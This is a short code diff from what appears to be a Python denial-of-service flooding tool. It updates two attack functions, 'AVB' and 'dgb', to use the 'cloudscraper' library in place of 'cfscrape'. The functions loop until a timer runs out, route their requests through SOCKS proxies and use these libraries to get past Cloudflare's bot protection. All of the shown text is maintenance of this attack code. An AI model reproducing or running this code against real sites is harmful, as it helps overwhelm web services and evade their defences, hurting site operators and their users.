@@ -736,7 +736,7 @@ def AVB(event, socks_type):
     payload = str(random._urandom(64))
     while time.time() < timer:
         try:
-            s = cfscrape.create_scraper()
+            s = cloudscraper.create_scraper()
             if socks_type == 5 or socks_type == 4:
                 s.proxies['http'] = 'socks{}://'.format(socks_type) + str(proxy[0]) + ":" + str(proxy[1])
                 s.proxies['https'] = 'socks{}://'.format(socks_type) + str(proxy[0]) + ":" + str(proxy[1])
@@ -783,7 +783,7 @@ def dgb(event, socks_type):
     event.wait()
     while time.time() < timer:
         try:
-            s = cfscrape.create_scraper()
+            s = cloudscraper.create_scraper()
             if socks_type == 5 or socks_type == 4:
                 s.proxies['http'] = 'socks{}://'.format(socks_type) + str(proxy[0]) + ":" + str(proxy[1])
                 s.proxies['https'] = 'socks{}://'.format(socks_type) + str(proxy[0]) + ":" + str(proxy[1])
